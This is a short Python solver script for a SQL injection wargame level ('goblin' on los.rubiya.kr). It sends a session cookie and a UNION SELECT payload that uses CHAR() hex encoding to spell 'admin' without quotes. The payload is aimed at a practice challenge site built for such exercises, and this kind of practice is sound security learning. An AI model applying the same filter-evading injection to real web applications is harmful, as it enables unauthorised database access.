import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/goblin_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

res = requests.get(url, params={'no':'0 union select CHAR(0x61,0x64,0x6d,0x69,0x6e)'},cookies=cookie)
if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")